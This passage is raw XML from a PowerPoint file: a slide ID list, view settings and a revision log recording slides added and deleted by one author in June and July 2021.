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512" r:id="rId3"/>
    <p:sldId id="373" r:id="rId4"/>
    <p:sldId id="444" r:id="rId5"/>
    <p:sldId id="491" r:id="rId6"/>
    <p:sldId id="446" r:id="rId7"/>
    <p:sldId id="490" r:id="rId8"/>
    <p:sldId id="492" r:id="rId9"/>
    <p:sldId id="445" r:id="rId10"/>
    <p:sldId id="493" r:id="rId11"/>
    <p:sldId id="494" r:id="rId12"/>
    <p:sldId id="495" r:id="rId13"/>
    <p:sldId id="496" r:id="rId14"/>
    <p:sldId id="497" r:id="rId15"/>
    <p:sldId id="453" r:id="rId16"/>
    <p:sldId id="454" r:id="rId17"/>
    <p:sldId id="498" r:id="rId18"/>
    <p:sldId id="510" r:id="rId19"/>
    <p:sldId id="499" r:id="rId20"/>
    <p:sldId id="500" r:id="rId21"/>
    <p:sldId id="501" r:id="rId22"/>
    <p:sldId id="502" r:id="rId23"/>
    <p:sldId id="503" r:id="rId24"/>
    <p:sldId id="504" r:id="rId25"/>
    <p:sldId id="505" r:id="rId26"/>
    <p:sldId id="506" r:id="rId27"/>
    <p:sldId id="513" r:id="rId28"/>
    <p:sldId id="514" r:id="rId29"/>
    <p:sldId id="518" r:id="rId30"/>
    <p:sldId id="517" r:id="rId31"/>
    <p:sldId id="516" r:id="rId32"/>
    <p:sldId id="525" r:id="rId33"/>
    <p:sldId id="526" r:id="rId34"/>
    <p:sldId id="524" r:id="rId35"/>
    <p:sldId id="519" r:id="rId36"/>
    <p:sldId id="520" r:id="rId37"/>
    <p:sldId id="522" r:id="rId38"/>
    <p:sldId id="523" r:id="rId39"/>
    <p:sldId id="521" r:id="rId40"/>
    <p:sldId id="467" r:id="rId41"/>
    <p:sldId id="508" r:id="rId42"/>
    <p:sldId id="509" r:id="rId43"/>
    <p:sldId id="511" r:id="rId44"/>
    <p:sldId id="507" r:id="rId45"/>
    <p:sldId id="42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1B83AC-F9AE-4056-9599-2DACFAA8A130}" v="70" dt="2025-01-24T21:20:27.2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82" autoAdjust="0"/>
    <p:restoredTop sz="86667" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="75" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="1061"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feng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}"/>
    <pc:docChg chg="addSld delSld modSld">
      <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-07-01T14:18:37.659" v="55" actId="6549"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:38:19.716" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1325061211" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2616338024" sldId="373"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:23.201" v="12" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2789471632" sldId="392"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:28.988" v="22" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2467691949" sldId="394"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:29.667" v="26" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1635951812" sldId="396"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:30.660" v="31" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3665038014" sldId="404"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:32.953" v="39" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2489270501" sldId="411"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:33.208" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3118374455" sldId="414"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:30.420" v="30" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4266318337" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:33.801" v="41" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4247754591" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3782016356" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:23.068" v="11" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4091828154" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:21.235" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="593614233" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:32.187" v="36" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2829655940" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:37.137" v="49" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4105321355" sldId="439"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:40.112" v="50" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1827660371" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:41.177" v="51" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="117761190" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:34.634" v="43" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4060643725" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:42.517" v="52" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="177244511" sldId="443"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-07-01T14:03:43.721" v="53" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="969276203" sldId="444"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2518429501" sldId="445"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2089025007" sldId="446"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:21.736" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="396884143" sldId="447"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:21.938" v="4" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2623075134" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.262" v="5" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3726437819" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.449" v="7" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2752542596" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:23.913" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1689162150" sldId="451"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:24.202" v="15" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3213363844" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2427580819" sldId="453"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="156228340" sldId="454"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.776" v="9" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="855798641" sldId="455"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.612" v="8" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3068364558" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.913" v="10" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="565360195" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:24.050" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2399777802" sldId="458"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:28.818" v="21" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="783190951" sldId="459"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:24.505" v="17" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3533845808" sldId="460"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:27.003" v="18" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="982174642" sldId="461"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:22.278" v="6" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="926730047" sldId="462"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:24.346" v="16" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2128572627" sldId="463"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:29.162" v="23" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3901806330" sldId="464"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:28.042" v="19" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1673180284" sldId="465"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:28.602" v="20" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="369337190" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="965843776" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:29.322" v="24" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1544977207" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:29.501" v="25" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3247576171" sldId="469"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:29.865" v="27" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3121458959" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:30.254" v="28" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2693326884" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:30.263" v="29" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="127914859" sldId="472"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:31.073" v="32" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2516623109" sldId="475"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:31.393" v="33" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3141623341" sldId="476"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:31.714" v="34" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4107473677" sldId="477"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:31.858" v="35" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1773530336" sldId="478"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:34.221" v="42" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2418320045" sldId="481"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:32.426" v="37" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1683867025" sldId="482"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:32.693" v="38" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3022927922" sldId="484"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:34.898" v="44" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1979037057" sldId="485"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:35.185" v="45" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="229412847" sldId="486"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:35.713" v="46" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="127162036" sldId="487"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:36.169" v="47" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1436574554" sldId="488"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:40:36.576" v="48" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3579863255" sldId="489"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1435293485" sldId="490"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3015196105" sldId="491"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-07-01T14:18:37.659" v="55" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1674251011" sldId="492"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Weifeng Xu" userId="e7aed605-a3dd-4d5a-a692-a87037af107b" providerId="ADAL" clId="{5B9B619E-E5DC-4376-BCE8-41ABC28F6C2F}" dt="2021-06-28T19:39:54.424" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2416641626" sldId="493"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
